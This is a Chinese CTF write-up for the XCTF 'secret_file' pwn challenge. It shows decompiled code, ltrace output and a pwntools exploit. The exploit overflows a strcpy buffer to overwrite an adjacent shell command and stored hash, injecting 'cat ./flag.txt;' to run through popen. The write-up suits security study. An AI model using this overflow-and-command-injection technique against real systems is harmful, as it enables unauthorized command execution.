<!DOCTYPE HTML><html lang="zh-CN"><head><meta charset="utf-8"><meta name="keywords" content="攻防世界pwn-secret_file, 小哑师兄"><meta name="description" content="将登太行雪满山"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><meta name="renderer" content="webkit|ie-stand|ie-comp"><meta name="mobile-web-app-capable" content="yes"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><script async src="https://www.googletagmanager.com/gtag/js?id=G-4ZH1MJ8JGK"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-4ZH1MJ8JGK")</script><title>攻防世界pwn-secret_file | 小哑师兄</title><link rel="icon" type="image/jpeg" href="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/avatar.jpg"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xysxya/xysxya/libs/awesome/css/all.css"><link rel="stylesheet" type="text/css" href="https://cdn.staticfile.org/materialize/1.0.0/css/materialize.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.staticfile.org/aos/2.3.4/aos.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xysxya/xysxya/libs/animate/animate.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xysxya/xysxya/libs/lightGallery/css/lightgallery.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xysxya/xysxya/css/matery.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xysxya/xysxya/css/my.css"><script src="https://cdn.staticfile.org/jquery/3.7.1/jquery.min.js"></script><meta name="generator" content="Hexo 6.3.0"></head><style>body{background-image:url(https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/background.png);background-repeat:no-repeat;background-size:cover;background-attachment:fixed}</style><body><header class="navbar-fixed"><nav id="headNav" class="bg-color nav-transparent"><div id="navContainer" class="nav-wrapper container"><div class="brand-logo"><a href="/" class="waves-effect waves-light"><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/avatar.jpg" class="logo-img" alt="LOGO"> <span class="logo-span">小哑师兄</span></a></div><a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a><ul class="right nav-menu"><li class="hide-on-med-and-down nav-item"><a href="/" class="waves-effect waves-light"><i class="fas fa-home" style="zoom:.6"></i> <span>首页</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/tags" class="waves-effect waves-light"><i class="fas fa-tags" style="zoom:.6"></i> <span>标签</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/categories" class="waves-effect waves-light"><i class="fas fa-bookmark" style="zoom:.6"></i> <span>分类</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/archives" class="waves-effect waves-light"><i class="fas fa-archive" style="zoom:.6"></i> <span>归档</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/about" class="waves-effect waves-light"><i class="fas fa-user-circle" style="zoom:.6"></i> <span>关于</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/friends" class="waves-effect waves-light"><i class="fas fa-address-book" style="zoom:.6"></i> <span>友情链接</span></a></li><li><a href="#searchModal" class="modal-trigger waves-effect waves-light"><i id="searchIcon" class="fas fa-search" title="搜索" style="zoom:.85"></i></a></li></ul><div id="mobile-nav" class="side-nav sidenav"><div class="mobile-head bg-color"><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/avatar.jpg" class="logo-img circle responsive-img"><div class="logo-name">小哑师兄</div><div class="logo-desc">将登太行雪满山</div></div><ul class="menu-list mobile-menu-list"><li class="m-nav-item"><a href="/" class="waves-effect waves-light"><i class="fa-fw fas fa-home"></i> 首页</a></li><li class="m-nav-item"><a href="/tags" class="waves-effect waves-light"><i class="fa-fw fas fa-tags"></i> 标签</a></li><li class="m-nav-item"><a href="/categories" class="waves-effect waves-light"><i class="fa-fw fas fa-bookmark"></i> 分类</a></li><li class="m-nav-item"><a href="/archives" class="waves-effect waves-light"><i class="fa-fw fas fa-archive"></i> 归档</a></li><li class="m-nav-item"><a href="/about" class="waves-effect waves-light"><i class="fa-fw fas fa-user-circle"></i> 关于</a></li><li class="m-nav-item"><a href="/friends" class="waves-effect waves-light"><i class="fa-fw fas fa-address-book"></i> 友情链接</a></li><li><div class="divider"></div></li><li><a href="https://github.com/xysxya" class="waves-effect waves-light" target="_blank"><i class="fab fa-github-square fa-fw"></i>Fork Me</a></li></ul></div></div><style>.nav-transparent .github-corner{display:none!important}.github-corner{position:absolute;z-index:10;top:0;right:0;border:0;transform:scale(1.1)}.github-corner svg{color:#0f9d58;fill:#fff;height:64px;width:64px}.github-corner:hover .octo-arm{animation:a .56s ease-in-out}.github-corner .octo-arm{animation:none}@keyframes a{0%,to{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}</style><a href="https://github.com/xysxya" class="github-corner tooltipped hide-on-med-and-down" target="_blank" data-tooltip="Fork Me" data-position="left" data-delay="50"><svg viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a></nav></header><script src="https://cdn.staticfile.org/crypto-js/4.1.1/crypto-js.min.js"></script><script></script><div class="bg-cover pd-header post-cover" style="background-image:url(https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-7peqme.jpg)"><div class="container" style="right:0;left:0"><div class="row"><div class="col s12 m12 l12"><div class="brand"><h1 class="description center-align post-title">攻防世界pwn-secret_file</h1></div></div></div></div></div><main class="container content"><div id="artDetail"><div class="card"><div class="card-content article-info"><div class="row tag-cate"><div class="col s7"><div class="article-tag"><a href="/tags/PWN/"><span class="chip bg-color">PWN</span></a></div></div><div class="col s5 right-align"><div class="post-cate"><i class="fas fa-bookmark fa-fw icon-category"></i> <a href="/categories/CTF/" class="post-category">CTF</a></div></div></div><div class="post-info"><div class="post-date info-break-policy"><i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp; 2024-07-25</div><div class="post-date info-break-policy"><i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp; 2024-07-25</div><div class="info-break-policy"><i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp; 752</div><div class="info-break-policy"><i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp; 3 分</div><div id="busuanzi_container_page_pv" class="info-break-policy"><i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp; <span id="busuanzi_value_page_pv"></span></div></div></div><hr class="clearfix"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xysxya/xysxya/libs/prism/prism.css"><style type="text/css">code[class*=language-],pre[class*=language-]{white-space:pre-wrap!important}</style><div class="card-content article-card-content"><div id="articleContent"><blockquote><p>通过<code>strcmp</code>函数覆盖参数，从而使得判断条件成立，执行函数内命令。</p></blockquote><p><code>checksec</code>查看发现保护全开</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Arch:     amd64-64-little
   RELRO:    Full RELRO
   Stack:    Canary found
   NX:       NX enabled
   PIE:      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用ltrace跟踪一下库函数调用，用<code>snprintf</code>写入了几组数据，有用到<code>strcpy</code>函数进行一个复制，，用<code>strcmp</code>进行比较。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace ./secret
__libc_start_main<span class="token punctuation">(</span>0x564446800af0, <span class="token number">1</span>, 0x7ffda5eed7e8, 0x564446800f90 <span class="token operator">&lt;</span>unfinished <span class="token punctuation">..</span>.<span class="token operator">></span>
snprintf<span class="token punctuation">(</span><span class="token string">"/bin/cat ./secret_data.asc"</span>, <span class="token number">27</span>, <span class="token string">"%s"</span>, <span class="token string">"/bin/cat ./secret_data.asc"</span><span class="token punctuation">)</span>                             <span class="token operator">=</span> <span class="token number">26</span>
snprintf<span class="token punctuation">(</span><span class="token string">"9387a00e31e413c55af9c08c69cd119a"</span><span class="token punctuation">..</span>., <span class="token number">65</span>, <span class="token string">"%s"</span>, <span class="token string">"9387a00e31e413c55af9c08c69cd119a"</span><span class="token punctuation">..</span>.<span class="token punctuation">)</span>           <span class="token operator">=</span> <span class="token number">64</span>
getline<span class="token punctuation">(</span>0x7ffda5eed3d8, 0x7ffda5eed3d0, 0x7fc22a6ccaa0, 1aaaaa
<span class="token punctuation">)</span>                                                 <span class="token operator">=</span> <span class="token number">6</span>
strrchr<span class="token punctuation">(</span><span class="token string">"aaaaa<span class="token entity" title="\n">\n</span>"</span>, <span class="token string">'\n'</span><span class="token punctuation">)</span>                                                                                   <span class="token operator">=</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span>
strcpy<span class="token punctuation">(</span>0x7ffda5eed3e0, <span class="token string">"aaaaa"</span><span class="token punctuation">)</span>                                                                            <span class="token operator">=</span> 0x7ffda5eed3e0
SHA256_Init<span class="token punctuation">(</span>0x7ffda5eed320, 0x7ffda5eed53c, <span class="token number">256</span>, <span class="token number">0</span><span class="token punctuation">)</span>                                                        <span class="token operator">=</span> <span class="token number">1</span>
SHA256_Update<span class="token punctuation">(</span>0x7ffda5eed320, 0x7ffda5eed3e0, <span class="token number">256</span>, <span class="token number">0</span><span class="token punctuation">)</span>                                                      <span class="token operator">=</span> <span class="token number">1</span>
SHA256_Final<span class="token punctuation">(</span>0x7ffda5eed53c, 0x7ffda5eed320, 0x1dd13e23, 0x8cddb95<span class="token punctuation">)</span>                                        <span class="token operator">=</span> <span class="token number">1</span>
snprintf<span class="token punctuation">(</span><span class="token string">"9d"</span>, <span class="token number">3</span>, <span class="token string">"%02x"</span>, 0x9d<span class="token punctuation">)</span>                                                                            <span class="token operator">=</span> <span class="token number">2</span>
<span class="token builtin class-name">.</span>
<span class="token builtin class-name">.</span>
strcmp<span class="token punctuation">(</span><span class="token string">"9387a00e31e413c55af9c08c69cd119a"</span><span class="token punctuation">..</span>., <span class="token string">"9d579138b575917ac1224f82d8804c5a"</span><span class="token punctuation">..</span>.<span class="token punctuation">)</span>                       <span class="token operator">=</span> <span class="token parameter variable">-49</span>
puts<span class="token punctuation">(</span><span class="token string">"wrong password!"</span>wrong password<span class="token operator">!</span>
<span class="token punctuation">)</span>                                                                                    <span class="token operator">=</span> <span class="token number">16</span>
__cxa_finalize<span class="token punctuation">(</span>0x564446a02008, 0x564446a01d20, <span class="token number">1</span>, <span class="token number">1</span><span class="token punctuation">)</span>                                                       <span class="token operator">=</span> <span class="token number">1</span>
+++ exited <span class="token punctuation">(</span>status <span class="token number">1</span><span class="token punctuation">)</span> +++<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在IDA中分析一下，在这里要注意dest、command、hash_value，这几个参数，他们在栈中是连续的。在上文中提到会用到sprintf函数写入了几组数据，是在<code>sub_5593A2200E60(dest)</code>函数中实现的。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>lineptr<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-300h] BYREF</span>
<span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-2F8h] BYREF</span>
<span class="token keyword">char</span> command<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+110h] [rbp-1F8h] BYREF</span>
<span class="token keyword">char</span> hash_value<span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+12Bh] [rbp-1DDh] BYREF</span>
_QWORD v16<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+16Ch] [rbp-19Ch] BYREF</span>
<span class="token keyword">char</span> v17<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+18Ch] [rbp-17Ch] BYREF</span>
<span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment">// [rsp+1CCh] [rbp-13Ch] BYREF</span>
<span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">264</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+1D0h] [rbp-138h] BYREF</span>
<span class="token keyword">unsigned</span> __int64 v20<span class="token punctuation">;</span> <span class="token comment">// [rsp+2D8h] [rbp-30h]</span>

v20 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sub_5593A2200E60</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">// 通过dest加偏移的方式初始化command和hash_value</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>sub_5593A2200E60(dest)</code>函数中看一下，参数<code>a1</code>就是<code>dest</code>，通过<code>dest+偏移</code>的方式将数据分别写入到了command和hash_value中。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_5593A2200E60</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> v2<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-78h] BYREF</span>
  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-58h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-10h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token string">"/bin/cat ./secret_data.asc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">snprintf</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">27uLL</span><span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 写入到 command中</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token string">"9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">snprintf</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">283</span><span class="token punctuation">,</span> <span class="token number">65uLL</span><span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 写入到 hashvalue中</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过getline读取输入写入到lineptr中，之后又将lineptr通过strcpy函数复制到dest中，然后计算dest前0x100个字符的hash值，</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">v11 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  lineptr <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lineptr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v11<span class="token punctuation">,</span> MEMORY<span class="token punctuation">[</span><span class="token number">0x7FE33FA41870</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>lineptr<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v3 <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>v16<span class="token punctuation">;</span>                  <span class="token comment">//v4 = v16</span>
  v5 <span class="token operator">=</span> v17<span class="token punctuation">;</span>                                     <span class="token comment">// char *类型，对v5的操作直接对v7生效</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> lineptr<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// 通过strcpy函数覆盖dest处的值</span>
  <span class="token function">sub_5593A2200DD0</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>dest<span class="token punctuation">,</span> v16<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 计算dest前0x100个字符的hash值</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过do-while将输入的字符计算hash值后写入到v17中然后通过strcmp函数与初始化的hash_value进行比较，若相等，则会执行popen()函数来执行command初始化的命令。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">do</span>
 <span class="token punctuation">&#123;</span>
   v6 <span class="token operator">=</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span>
   v7 <span class="token operator">=</span> v5<span class="token punctuation">;</span>
   v5 <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
   <span class="token operator">++</span>v4<span class="token punctuation">;</span>
   <span class="token function">snprintf</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token number">3uLL</span><span class="token punctuation">,</span> <span class="token string">"%02x"</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v18 <span class="token punctuation">)</span><span class="token punctuation">;</span>
 v8 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>hash_value<span class="token punctuation">,</span> v17<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"wrong password!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 v9 <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v9 <span class="token punctuation">)</span>
   <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
 <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> v9<span class="token punctuation">)</span> <span class="token punctuation">)</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">fclose</span><span class="token punctuation">(</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">return</span> v8<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>hash值碰撞不出来，但是可以通过strcmp去覆盖初始化的hash值为我们要输入数据的hash值，将command覆盖为我们想要的命令（栈中是连续的）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>

<span class="token keyword">import</span> hashlib

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">'./secret'</span>
ip <span class="token operator">=</span> <span class="token string">'61.147.171.105'</span>
port <span class="token operator">=</span> <span class="token number">64902</span>

status <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">if</span> status <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
	sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
	sh <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>

value <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
value<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token operator">*</span><span class="token number">256</span><span class="token punctuation">)</span>
value1 <span class="token operator">=</span> value<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value1<span class="token punctuation">)</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b'1'</span><span class="token operator">*</span><span class="token number">256</span> <span class="token operator">+</span> <span class="token string">b'cat ./flag.txt;'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token string">b' '</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'bd93b4a63868f8c6028d3fa30bdb4f2c15b96e2ec6ac85acfa7bac4b40c4c683'</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><hr><div class="reprint" id="reprint-statement"><div class="reprint__author"><span class="reprint-meta" style="font-weight:700"><i class="fas fa-user">文章作者: </i></span><span class="reprint-info"><a href="/about" rel="external nofollow noreferrer">xysx</a></span></div><div class="reprint__type"><span class="reprint-meta" style="font-weight:700"><i class="fas fa-link">文章链接: </i></span><span class="reprint-info"><a href="https://blog.yangsx.cn/ctf-pwn/b23875f.html">https://blog.yangsx.cn/ctf-pwn/b23875f.html</a></span></div><div class="reprint__notice"><span class="reprint-meta" style="font-weight:700"><i class="fas fa-copyright">版权声明: </i></span><span class="reprint-info">本博客所有文章除特別声明外，均采用 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a> 许可协议。转载请注明来源 <a href="/about" target="_blank">xysx</a> !</span></div></div><script async defer>function navToReprintStatement(){$("html, body").animate({scrollTop:$("#reprint-statement").offset().top-80},800)}document.addEventListener("copy",function(t){M.toast({html:'<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>'})})</script><div class="tag_share" style="display:block"><div class="post-meta__tag-list" style="display:inline-block"><div class="article-tag"><a href="/tags/PWN/"><span class="chip bg-color">PWN</span></a></div></div><div class="post_share" style="zoom:80%;width:fit-content;display:inline-block;float:right;margin:-.15rem 0"><link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css"><div id="article-share"><div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div><script src="/libs/share/js/social-share.min.js"></script></div></div></div></div></div><style>.valine-card{margin:1.5rem auto}.valine-card .card-content{padding:20px 20px 5px 20px}#vcomments textarea{box-sizing:border-box;background:url(https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/comment_bg.png) 100% 100% no-repeat}#vcomments p{margin:2px 2px 10px;font-size:1.05rem;line-height:1.78rem}#vcomments blockquote p{text-indent:.2rem}#vcomments a{padding:0 2px;color:#4cbf30;font-weight:500;text-decoration:none}#vcomments img{max-width:100%;height:auto;cursor:pointer}#vcomments ol li{list-style-type:decimal}#vcomments ol,ul{display:block;padding-left:2em;word-spacing:.05rem}#vcomments ul li,ol li{display:list-item;line-height:1.8rem;font-size:1rem}#vcomments ul li{list-style-type:disc}#vcomments ul ul li{list-style-type:circle}#vcomments table,td,th{padding:12px 13px;border:1px solid #dfe2e5}#vcomments table,td,th{border:0}table tr:nth-child(2n),thead{background-color:#fafafa}#vcomments table th{background-color:#f2f2f2;min-width:80px}#vcomments table td{min-width:80px}#vcomments h1{font-size:1.85rem;font-weight:700;line-height:2.2rem}#vcomments h2{font-size:1.65rem;font-weight:700;line-height:1.9rem}#vcomments h3{font-size:1.45rem;font-weight:700;line-height:1.7rem}#vcomments h4{font-size:1.25rem;font-weight:700;line-height:1.5rem}#vcomments h5{font-size:1.1rem;font-weight:700;line-height:1.4rem}#vcomments h6{font-size:1rem;line-height:1.3rem}#vcomments p{font-size:1rem;line-height:1.5rem}#vcomments hr{margin:12px 0;border:0;border-top:1px solid #ccc}#vcomments blockquote{margin:15px 0;border-left:5px solid #42b983;padding:1rem .8rem .3rem .8rem;color:#666;background-color:rgba(66,185,131,.1)}#vcomments pre{font-family:monospace,monospace;padding:1.2em;margin:.5em 0;background:#272822;overflow:auto;border-radius:.3em;tab-size:4}#vcomments code{font-family:monospace,monospace;padding:1px 3px;font-size:.92rem;color:#e96900;background-color:#f8f8f8;border-radius:2px}#vcomments pre code{font-family:monospace,monospace;padding:0;color:#e8eaf6;background-color:#272822}#vcomments pre[class*=language-]{padding:1.2em;margin:.5em 0}#vcomments code[class*=language-],pre[class*=language-]{color:#e8eaf6}#vcomments [type=checkbox]:not(:checked),[type=checkbox]:checked{position:inherit;margin-left:-1.3rem;margin-right:.4rem;margin-top:-1px;vertical-align:middle;left:unset;visibility:visible}#vcomments b,strong{font-weight:700}#vcomments dfn{font-style:italic}#vcomments small{font-size:85%}#vcomments cite{font-style:normal}#vcomments mark{background-color:#fcf8e3;padding:.2em}#vcomments table,td,th{padding:12px 13px;border:1px solid #dfe2e5}table tr:nth-child(2n),thead{background-color:#fafafa}#vcomments table th{background-color:#f2f2f2;min-width:80px}#vcomments table td{min-width:80px}#vcomments 